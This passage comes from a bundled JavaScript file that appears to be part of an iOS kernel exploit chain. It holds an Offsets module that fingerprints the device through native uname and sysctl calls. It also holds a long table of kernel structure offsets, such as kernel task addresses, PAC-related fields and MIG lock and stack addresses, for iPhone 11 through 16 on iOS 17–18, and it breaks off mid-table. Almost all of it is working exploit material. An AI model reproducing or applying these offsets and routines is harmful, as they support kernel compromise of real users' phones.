		mpd_js_thread_spawn(scriptCFString, threadMem, true);
	}
}


/***/ }),

/***/ "./src/libs/Driver/Offsets.js":
/*!************************************!*\
  !*** ./src/libs/Driver/Offsets.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Offsets)
/* harmony export */ });
/* harmony import */ var libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/OffsetsStruct */ "./src/libs/Chain/OffsetsStruct.js");
/* harmony import */ var _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./OffsetsTable */ "./src/libs/Driver/OffsetsTable.js");



const TAG  = "OFFSETS"

class Offsets
{
	static getByDeviceAndVersion()
	{
		Native.callSymbol("uname", Native.mem);
		const sysname = Native.readString(Native.mem, 0x100);
		const nodename = Native.readString(Native.mem + 0x100n, 0x100);
		const release = Native.readString(Native.mem + 0x200n, 0x100);
		const version = Native.readString(Native.mem + 0x300n, 0x100);
		const machine = Native.readString(Native.mem + 0x400n, 0x100);
		console.log(TAG, `release: ${release} with machine: ${machine}`);

		const buildVer = this.getBuildVersion();
		console.log(TAG, "Build version: " + buildVer);

		let splittedVersion = release.split(".");
		let xnuMajor = splittedVersion[0];
		let xnuMinor = splittedVersion[1];

		let splittedMachine = machine.split(",");
		let deviceFamily = splittedMachine[0];
		let deviceModel = splittedMachine[1];

		console.log(TAG, "deviceFamily: " + deviceFamily);

		// Ugly hack to support 17.7, 17.7.1 and 17.7.2
		if (buildVer) {
			if (buildVer == "21H16")
				xnuMinor = 6.1;
			else if (buildVer == "21H216")
				xnuMinor = 6.2;
			else if (buildVer == "21H221")
				xnuMinor = 6.3;
		}
		// Get offsets per device family
		let deviceOffsets = _OffsetsTable__WEBPACK_IMPORTED_MODULE_1__.offsets[deviceFamily];
		if (!deviceOffsets) {
			console.log(TAG, `Unsupported machine: ${machine}`);
			return null;
		}

		let familyOffsets = deviceOffsets["*"];
		let foundFamilyOffsets = this.#getOffsetsByVersion(familyOffsets, xnuMajor, xnuMinor);

		if (!foundFamilyOffsets)
			return null;

		// Adjustments per device model
		let modelOffsets = deviceOffsets[deviceModel];
		let foundModelOffsets = null;
		if (modelOffsets)
			foundModelOffsets = this.#getOffsetsByVersion(modelOffsets, xnuMajor, xnuMinor);

		// Merge family offsets and device offsets
		let foundOffsets = new libs_Chain_OffsetsStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
		Object.assign(foundOffsets, foundFamilyOffsets);
		if (foundModelOffsets)
			Object.assign(foundOffsets, foundModelOffsets);

		if (["iPhone15", "iPhone16", "iPhone17"].includes(deviceFamily))
			foundOffsets.T1SZ_BOOT = 17n;
		else
			foundOffsets.T1SZ_BOOT = 25n;

		console.log(TAG, "Offsets: " + JSON.stringify(foundOffsets, (_,v) => typeof v === 'bigint' ? "0x"+v.toString(16) : v, 2));

		return foundOffsets;
	}

	static #getOffsetsByVersion(offsets, xnuMajor, xnuMinor) {
		let xnuMajorOffsets = 0;
		for (let major in offsets) {
			if (xnuMajor < major)
				continue;
			if (xnuMajorOffsets < major)
				xnuMajorOffsets = major;
		}

		if (!xnuMajorOffsets) {
			console.log(TAG, "Unsupported XNU major: " + xnuMajor);
			return null;
		}

		//console.log(TAG, "Matching XNU major: " + xnuMajorOffsets);
		xnuMajorOffsets = offsets[xnuMajorOffsets];

		let foundOffsets = {};
		let xnuMinorOffsets = -1;
		const sortedMinors = Object.keys(xnuMajorOffsets).sort();
		for (let minor of sortedMinors) {
			//console.log(TAG, `minor: ${minor}, xnuMinor: ${xnuMinor}`);
			if (minor > xnuMinor)
				break;
			if (xnuMinorOffsets < minor) {
				xnuMinorOffsets = minor;
				Object.assign(foundOffsets, xnuMajorOffsets[minor]);
			}
		}

		//console.log(TAG, "Matching XNU minor: " + xnuMinorOffsets);

		return foundOffsets;
	}
	static getBuildVersion() {
		const CTL_KERN = 1;
		const KERN_OSVERSION = 65;

		const mib = new ArrayBuffer(4 * 2);
		const mibView = new DataView(mib);
		mibView.setInt32(0, CTL_KERN, true);
		mibView.setInt32(4, KERN_OSVERSION, true);

		const mibAddr = Native.mem;
		const resultAddr = Native.mem + 0x100n;
		const lengthAddr = Native.mem + 0x200n;

		Native.write(Native.mem, mib);

		let ret = Native.callSymbol("sysctl", mibAddr, 2, resultAddr, lengthAddr, null, 0);
		if (ret != 0) {
			console.log(TAG, "Unable to get iOS build version");
			return null;
		}

		const length = Native.read32(lengthAddr);
		const buildVer = Native.readString(resultAddr, length);
		return buildVer;
	}
}


/***/ }),

/***/ "./src/libs/Driver/OffsetsTable.js":
/*!*****************************************!*\
  !*** ./src/libs/Driver/OffsetsTable.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   offsets: () => (/* binding */ offsets)
/* harmony export */ });
const offsets = {
	// iPhone XS
	// iPhone XS Max
	// iPhone XS Max Global
	// iPhone XR
	"iPhone11": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xe8n,
					ropPid: 0x150n,
					jopPid: 0x158n,
					guardExcCode: 0x308n,
					taskThreads: 0x348n,
					tro: 0x358n,
					ast: 0x37cn,
					mutexData: 0x380n,
					ctid: 0x408n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918210n,
					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x398n,
					ctid: 0x418n
				},
				4: {
					kernelTask: 0x91c638n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x320n,
					taskThreads: 0x360n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x920a90n
				},
				6: {
					kernelTask: 0x9209f0n
				},
				6.1: {
					kernelTask: 0x920a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f1548n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x320n,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				1: {
					kernelTask: 0x9f1560n,
					taskThreads: 0x368n,
					tro: 0x370n,
					ast: 0x394n,
					mutexData: 0x3a0n,
					ctid: 0x420n
				},
				2: {
					kernelTask: 0x9fd988n,
				},
				3: {
					kernelTask: 0x9f5988n
				},
				4: {
					kernelTask: 0xa62b50n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x370n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				5: {
					kernelTask: 0xa6ac38n
				},
				6: {
					kernelTask: 0xa6ad48n,
  					guardExcCode: 0x328n,
					taskThreads: 0x378n,
  					tro: 0x380n,
  					ast: 0x3a4n,
  					mutexData: 0x3b0n,
  					ctid: 0x430n,
  					migLock: 0x36971f0n,
  					migSbxMsg: 0x3697210n,
  					migKernelStackLR: 0x2f7c1a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x8fc638n
				},
				5: {
					kernelTask: 0x900a90n
				},
				6: {
					kernelTask: 0x9009f0n
				},
				6.1: {
					kernelTask: 0x900a40n
				}
			},
			24: {
				0: {
					kernelTask: 0x9d1548n
				},
				1: {
					kernelTask: 0x9d1560n,
				},
				2: {
					kernelTask: 0x9d9988n
				},
				3: {
					kernelTask: 0x9d1988n
				},
				4: {
					kernelTask: 0xa42b50n
				},
				5: {
					kernelTask: 0xad6b78n,
					migLock: 0x38d74e8n,
					migSbxMsg: 0x38d7508n,
					migKernelStackLR: 0x31b19e4n
				},
				6: {
					kernelTask: 0xa4ad48n,
					migLock: 0x352e1f0n,
					migSbxMsg: 0x352e210n,
					migKernelStackLR: 0x2e5ba20n,
				}
			}
		}
	},

	// iPhone 11
	// iPhone 11 Pro
	// iPhone 11 Pro Max
	// iPhone SE 2
	"iPhone12": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x96c178n,
				},
				4: {
					kernelTask: 0x970588n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x9749d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa494a0n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa518c8n
				},
				3: {
					kernelTask: 0xa498c8n
				},
				4: {
					kernelTask: 0xacea90n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
  					guardExcCode: 0x338n,
					taskThreads: 0x388n,
  					tro: 0x390n,
  					ast: 0x3b4n,
  					mutexData: 0x3c0n,
  					ctid: 0x440n,
					migLock: 0x38e34e8n,
					migSbxMsg: 0x38e3508n,
					migKernelStackLR: 0x31ba7a0n,
				}
			}
		},
		"3": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x974588n
				},
				5: {
					kernelTask: 0x9789d8n
				},
				6: {
					kernelTask: 0x974938n
				},
				6.1: {
					kernelTask: 0x974988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa49488n
				},
				1: {
					kernelTask: 0xa4d4a0n
				},
				2: {
					kernelTask: 0xa558c8n
				},
				3: {
					kernelTask: 0xa4d8c8n
				},
				4: {
					kernelTask: 0xacea90n
				},
				5: {
					kernelTask: 0xad6b78n
				},
				6: {
					kernelTask: 0xad6c88n,
					migLock: 0x38e7468n,
					migSbxMsg: 0x38e7488n,
					migKernelStackLR: 0x31bf5a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x960588n
				},
				5: {
					kernelTask: 0x9649d8n
				},
				6: {
					kernelTask: 0x964938n
				},
				6.1: {
					kernelTask: 0x964988n
				}
			},
			24: {
				0: {
					kernelTask: 0xa35488n
				},
				1: {
					kernelTask: 0xa354a0n
				},
				2: {
					kernelTask: 0xa3d8c8n
				},
				3: {
					kernelTask: 0xa358c8n
				},
				4: {
					kernelTask: 0xab6a90n
				},
				5: {
					kernelTask: 0xabeb78n
				},
				6: {
					kernelTask: 0xac2c88n,
					migLock: 0x387a8e8n,
					migSbxMsg: 0x387a908n,
					migKernelStackLR: 0x3156f20n,
				}
			}
		}
	},

	// iPhone 12
	// iPhone 12 Mini
	// iPhone 12 Pro
	// iPhone 12 Pro Max
	"iPhone13": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5bcn,
					kstackptr: 0xf0n,
					ropPid: 0x158n,
					jopPid: 0x160n,
					guardExcCode: 0x318n,
					taskThreads: 0x358n,
					tro: 0x368n,
					ast: 0x38cn,
					mutexData: 0x390n,
					ctid: 0x418n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x94c2d0n,
					guardExcCode: 0x328n,
					taskThreads: 0x368n,
					tro: 0x378n,
					ast: 0x39cn,
					mutexData: 0x3a8n,
					ctid: 0x428n
				},
				4: {
					kernelTask: 0x9546e0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					procRO: 0x388n
				},
				5: {
					kernelTask: 0x954b30n
				},
				6: {
					kernelTask: 0x954a90n
				},
				6.1: {
					kernelTask: 0x954ae0n
				}
			},
			24: {
				0: {
					kernelTask: 0xa295e0n,
					pComm: 0x56cn,
					procRO: 0x3a0n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5dcn,
					kstackptr: 0xf8n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				1: {
					kernelTask: 0xa2d5f8n,
					taskThreads: 0x378n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n
				},
				2: {
					kernelTask: 0xa35a20n
				},
				3: {
					kernelTask: 0xa2da20n
				},
				4: {
					kernelTask: 0xa9ebe8n,
					procRO: 0x3c0n,
					excGuard: 0x5fcn,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n,
					migLock: 0x37b8b80n,
					migSbxMsg: 0x37b8ba0n,
					migKernelStackLR: 0x3190fa0n
				},
				5: {
					kernelTask: 0xaa6cd0n,
					migLock: 0x37d4c90n,
					migSbxMsg: 0x37d4cb0n,
					migKernelStackLR: 0x31acce4n
				},
				6: {
					kernelTask: 0xaaade0n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n,
					migLock: 0x37dcc90n,
					migSbxMsg: 0x37dccb0n,
					migKernelStackLR: 0x31b5b60n,
				}
			}
		}
	},

	// iPhone 13
	// iPhone 13 Mini
	// iPhone 13 Pro
	// iPhone 13 Pro Max
	// iPhone SE 3
	// iPhone 14
	// iPhone 14 Plus
	"iPhone14": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x918ee0n,
				},
				4: {
					kernelTask: 0x91d318n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x925770n
				},
				6: {
					kernelTask: 0x9256d0n
				},
				6.1: {
					kernelTask: 0x925720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f6230n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f6248n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0xa02678n
				},
				3: {
					kernelTask: 0x9fa678n
				},
				4: {
					kernelTask: 0xa67b18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x382c218n,
					migSbxMsg: 0x382c238n,
					migKernelStackLR: 0x317d020n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x3848428n,
					migSbxMsg: 0x3848448n,
					migKernelStackLR: 0x31994a4n
				},
				6: {
					kernelTask: 0xa73d10n,
					guardExcCode: 0x340n,
					taskThreads: 0x390n,
					tro: 0x398n,
					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x38543a8n,
					migSbxMsg: 0x38543c8n,
					migKernelStackLR: 0x31a27e0n,
				}
			}
		},
		"6": {
			23: {
				4: {
					kernelTask: 0x92d318n
				},
				5: {
					kernelTask: 0x935770n
				},
				6: {
					kernelTask: 0x9316d0n
				},
				6.1: {
					kernelTask: 0x931720n
				}
			},
			24: {
				0: {
					kernelTask: 0xa06230n
				},
				1: {
					kernelTask: 0xa06248n
				},
				2: {
					kernelTask: 0xa12678n
				},
				3: {
					kernelTask: 0xa0a678n
				},
				4: {
					kernelTask: 0xa77b18n,
					migLock: 0x3898c18n,
					migSbxMsg: 0x3898c38n,
					migKernelStackLR: 0x31dff60n
				},
				5: {
					kernelTask: 0xa7fc00n,
					migLock: 0x38b4e28n,
					migSbxMsg: 0x38b4e48n,
					migKernelStackLR: 0x31fc3e4n
				},
				6: {
					kernelTask: 0xa83d10n,
					migLock: 0x38bcda8n,
					migSbxMsg: 0x38bcdc8n,
					migKernelStackLR: 0x3205560n,
				}
			}
		},
		"7": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		},
		"8": {
			23: {
				4: {
					kernelTask: 0x919318n
				},
				5: {
					kernelTask: 0x921770n
				},
				6: {
					kernelTask: 0x9216d0n
				},
				6.1: {
					kernelTask: 0x921720n
				}
			},
			24: {
				0: {
					kernelTask: 0x9f2230n
				},
				1: {
					kernelTask: 0x9f2248n
				},
				2: {
					kernelTask: 0x9fe678n
				},
				3: {
					kernelTask: 0x9f6678n
				},
				4: {
					kernelTask: 0xa67b18n,
					migLock: 0x3813d98n,
					migSbxMsg: 0x3813db8n,
					migKernelStackLR: 0x3163ae0n
				},
				5: {
					kernelTask: 0xa6fc00n,
					migLock: 0x382ffa8n,
					migSbxMsg: 0x382ffc8n,
					migKernelStackLR: 0x317ffa4n
				},
				6: {
					kernelTask: 0xa6fd10n,
					migLock: 0x3833fa8n,
					migSbxMsg: 0x3833fc8n,
					migKernelStackLR: 0x31852a0n,
				}
			}
		}
	},

	// iPhone 14 Pro
	// iPhone 14 Pro Max
	// iPhone 15
	// iPhone 15 Plus
	"iPhone15": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0xf0n,
					ropPid: 0x160n,
					jopPid: 0x168n,
					guardExcCode: 0x330n,
					taskThreads: 0x370n,
					tro: 0x380n,
					ast: 0x3a4n,
					mutexData: 0x3b0n,
					ctid: 0x430n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x914e00n,
				},
				4: {
					kernelTask: 0x919238n,
					pComm: 0x56cn,
					troTask: 0x28n,
					guardExcCode: 0x338n,
					taskThreads: 0x378n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				5: {
					kernelTask: 0x921690n
				},
				6: {
					kernelTask: 0x9215f0n
				},
				6.1: {
					kernelTask: 0x921640n
				},
				6.2: {
					kernelTask: 0x91d640n
				}
			},
			24: {
				0: {
					kernelTask: 0x9ee150n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0xf8n,
					ropPid: 0x168n,
					jopPid: 0x170n,
					guardExcCode: 0x338n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x440n
				},
				1: {
					kernelTask: 0x9f2168n,
					taskThreads: 0x380n,
					tro: 0x388n,
					ast: 0x3acn,
					mutexData: 0x3b8n,
					ctid: 0x438n
				},
				2: {
					kernelTask: 0x9fe598n
				},
				3: {
					kernelTask: 0x9f6598n
				},
				4: {
					kernelTask: 0xa67c18n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x388n,
					tro: 0x390n,
					ast: 0x3b4n,
					mutexData: 0x3c0n,
					ctid: 0x448n,
					migLock: 0x37863f8n,
					migSbxMsg: 0x3786418n,
					migKernelStackLR: 0x3131620n
				},
				5: {
					kernelTask: 0xa6fd00n,
					migLock: 0x37a2788n,
					migSbxMsg: 0x37a27a8n,
					migKernelStackLR: 0x314dc24n
				},
				6: {
					kernelTask: 0xa6fe10n,
  					guardExcCode: 0x340n,
					taskThreads: 0x390n,
  					tro: 0x398n,
  					ast: 0x3bcn,
					mutexData: 0x3c8n,
					ctid: 0x450n,
					migLock: 0x37aa708n,
					migSbxMsg: 0x37aa728n,
					migKernelStackLR: 0x3152ee0n
				}
			}
		},
		"4": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		},
		"5": {
			23: {
				4: {
					kernelTask: 0x941238n
				},
				5: {
					kernelTask: 0x949690n
				},
				6: {
					kernelTask: 0x9495f0n
				},
				6.1: {
					kernelTask: 0x949640n
				}
			},
			24: {
				0: {
					kernelTask: 0xa2a150n
				},
				1: {
					kernelTask: 0xa2a168n
				},
				2: {
					kernelTask: 0xa3a598n
				},
				3: {
					kernelTask: 0xa32598n
				},
				4: {
					kernelTask: 0xaa3c18n,
					migLock: 0x38c5388n,
					migSbxMsg: 0x38c53a8n,
					migKernelStackLR: 0x325f1e0n
				},
				5: {
					kernelTask: 0xaa7d00n,
					migLock: 0x38dd698n,
					migSbxMsg: 0x38dd6b8n,
					migKernelStackLR: 0x32777e4n
				},
				6: {
					kernelTask: 0xaabe10n,
					migLock: 0x38e5618n,
					migSbxMsg: 0x38e5638n,
					migKernelStackLR: 0x3280aa0n,
				}
			}
		}
	},

	// iPhone 15 Pro
	// iPhone 15 Pro Max
	"iPhone16": {
		"*": {
			23: {
				0: {
					pComm: 0x568n,
					excGuard: 0x5d4n,
					kstackptr: 0x140n,
					ropPid: 0x1b0n,
					jopPid: 0x1b8n,
					guardExcCode: 0x380n,
					taskThreads: 0x3c0n,
					tro: 0x3d0n,
					ast: 0x3f4n,
					mutexData: 0x400n,
					ctid: 0x480n,
					troTask: 0x20n
				},
				3: {
					kernelTask: 0x978ef0n,
				},
				4: {
					kernelTask: 0x991eb0n,
					pComm: 0x56cn,
					troTask: 0x28n,
					options: 0xc0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3c8n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				5: {
					kernelTask: 0x99a308n,
				},
				6: {
					kernelTask: 0x99a268n
				},
				6.1: {
					kernelTask: 0x99a2b8n
				},
				6.2: {
					kernelTask: 0x9962b8n
				}
			},
			24: {
				0: {
					kernelTask: 0xaae870n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5f4n,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x388n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x490n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xaae888n,
					taskThreads: 0x3d0n,
					tro: 0x3d8n,
					ast: 0x3fcn,
					mutexData: 0x408n,
					ctid: 0x488n
				},
				2: {
					kernelTask: 0xab6cb8n
				},
				3: {
					kernelTask: 0xab2cb8n
				},
				4: {
					kernelTask: 0xb23d28n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x498n,
					migLock: 0x3c03ef0n,
					migSbxMsg: 0x3c03f10n,
					migKernelStackLR: 0x3582fe0n
				},
				5: {
					kernelTask: 0xb2be10n,
					migLock: 0x3c181a8n,
					migSbxMsg: 0x3c181c8n,
					migKernelStackLR: 0x35993a4n
				},
				6: {
					kernelTask: 0xb2ff20n,
  					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a0n,
					migLock: 0x3c241a8n,
					migSbxMsg: 0x3c241c8n,
					migKernelStackLR: 0x35a26a0n,
				}
			}
		}
	},
	// iPhone 16
	// iPhone 16 plus
	// iPhone 16 pro
	// iPhone 16 pro max
	"iPhone17": {
		"*": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
					ctid: 0x4a0n,
				},
				2: {
					kernelTask: 0xb86610n
				},
				3: {
					kernelTask: 0xb82610n
				},
				4: {
					kernelTask: 0xc0fd80n,
					procRO: 0x3e0n,
					excGuard: 0x624n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					migLock: 0x4042dc0n,
					migSbxMsg: 0x4042de0n,
					migKernelStackLR: 0x3912aa0n
				},
				5: {
					kernelTask: 0xc17e68n,
					migLock: 0x405eff8n,
					migSbxMsg: 0x405f018n,
					migKernelStackLR: 0x392be64n
				},
				6: {
					kernelTask: 0xc1bf78n,
  					guardExcCode: 0x398n,
					taskThreads: 0x3e8n,
  					tro: 0x3f0n,
					ast: 0x414n,
					mutexData: 0x420n,
					ctid: 0x4b0n,
					migLock: 0x4066f88n,
					migSbxMsg: 0x4066fa8n,
					migKernelStackLR: 0x39352e0n,
				}
			}
		},
		"5": {
			24: {
				0: {
					kernelTask: 0xb7e1c8n,
					pComm: 0x56cn,
					procRO: 0x3b8n,
					ipcSpace: 0x318n,
					troTask: 0x28n,
					excGuard: 0x5fcn,
					kstackptr: 0x148n,
					ropPid: 0x1b8n,
					jopPid: 0x1c0n,
					guardExcCode: 0x390n,
					taskThreads: 0x3e0n,
  					tro: 0x3e8n,
					ast: 0x40cn,
					mutexData: 0x418n,
					ctid: 0x4a8n,
					options: 0xc0n
				},
				1: {
					kernelTask: 0xb7e1e0n,
					taskThreads: 0x3d8n,
					tro: 0x3e0n,
					ast: 0x404n,
					mutexData: 0x410n,
